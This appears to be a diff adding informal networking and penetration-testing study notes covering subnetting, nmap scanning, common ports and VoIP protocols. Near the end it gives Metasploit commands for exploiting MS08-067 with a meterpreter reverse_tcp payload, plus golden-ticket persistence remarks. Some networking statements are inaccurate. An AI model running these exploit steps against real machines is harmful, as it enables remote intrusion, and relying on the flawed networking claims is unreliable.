@@ -1,0 +1,75 @@
+10.87.2.0/24
+network | | | 
+CYBER = classless interdomain routing
+gives 
+1. network
+2. broadcast 
+	last address (10.87.2.255)
+	used for ping - sent to all clients on network
+	can hide addresses - if no outward traffic, can't find which
+3. clients
+4. gateway
+	assumed to be either 1 or 254; can be random
+
+1-255 are usable
+
+10.87.2.0/25 - completely seperate network
+different subnet
+	broadcast - 10.87.2.127
+can't know how many times split, but can find where it ends
+
+10.87.2.128/25 - broadcast is on 256, distinct from network above
+
+^
+| this can all be googled
+
+24 = matching bits in ip address
+
+same network:
+	only need switch
+
+two seperate networks:
+	need a router
+	
+network scanners:
+	nmap
+	ping (nmap -sP 10.87.2.0/24)
+	can find os version, details
+	tcp != udp
+	ports - http, https, ftp (control 21, data 20), dns, ntp, dhcp, ssh 22
+	honeypots fool scanners (imitate OS)
+	in competitions, custom services (unique, non-standard)
+
+SIP - session initiation protocol
+H.225.0 - different version of SIP
+RTP - real time protocol (audio data)
+g711U - voice encoding
+
+rhost - remote host
+rport - remote port
+
+ms08-067 - xp vulnerability 
+	rport is 445 (part of exploit)
+nt - windows before '95
+
+use reverse https:
+	encrypted
+	hides your traffic
+
+msfconsole	// at any time, # show options
+	search ms08-067 // has a giant database with all exploits
+	use exploit/path/to/ms08-067	// just a script
+	set RHOST <ip addr>
+	set payload windows/meterpreter/reverse_tcp // gives fun ways of remoting to peoples machines
+	set lhost <your ip>
+	exploit - after this you can do basically anything
+		file browser
+		webcam
+		format - 'post exploitation module'
+	'will get detected by every av ever'
+
+golden ticket - very hard to revoke
+	some orgs just kill all accounts and rebuild
+	
+domain controllers issue 'self-signing certificates'
+	no expiry - ensures control is never split
